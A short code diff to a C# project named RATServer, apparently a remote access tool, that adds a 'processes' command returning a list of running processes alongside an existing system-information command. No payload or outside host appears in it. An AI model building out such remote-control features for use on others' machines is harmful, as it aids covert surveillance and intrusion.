@@ -77,6 +77,10 @@ namespace RATServer
                             r.Type = "Message";
                             r.Msg = Functions.PCInfo();
                             break;
+                        case "processes":
+                            r.Type = "Message";
+                            r.Msg = Functions.Processes();
+                            break;
                         default:
                             break;
                     }                 
